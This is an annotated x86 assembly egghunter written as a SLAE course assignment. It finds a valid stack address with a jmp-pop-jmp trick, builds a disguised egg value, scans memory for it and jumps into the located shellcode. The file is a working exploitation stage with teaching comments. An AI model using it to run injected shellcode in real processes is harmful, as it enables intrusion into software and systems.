; SLAE-XXX
; thanks for previous students write up :] 
; assignment 3: egghunter shellcode 
; originality: I used the jmp pop jmp technique, i have not seen it used and the other techniques did not work for me besides giving segfaults :D 



global _start

section .text


_start:
; its not possible to start from addres 0x0 as its unmapped by the proc and so will trigger segfault, so we need to use a valid address
; to do so we call a func , pop the ret address from the stack, restore it (push it) and now we have valid address in eax      
 jmp func; 
; egg signature is different from what is hardcoded here , its a trick to not detect this instruction address 
; see below why we use 0x50 and 0x90 
eggcreate:  
 mov ebx, dword 0x5090508f 
 inc ebx ; final egg code is in ebx
 
next_addr:
; increasing memory address to look at next address 
; limit: if the shell code is located below in memory it will not find it before segfault ofc :) 
 inc eax  ; replace to dec eax for lower memory search 
; check if our egg is at that memory address, if yes then set Zero Flag 
 cmp dword [eax], ebx 
; if Zero Flag is not set (check failed), then loop to next_addr
 jne next_addr  
; since we jump directly to the shellcode, the egg should be valid instructions and not breaks the execution
; here we used 0x50905090 , push eax and nop  
 jmp eax ; 
 
; function used to get valid address on the stack and pop / save it 
func:
 pop eax 
 jmp eggcreate 
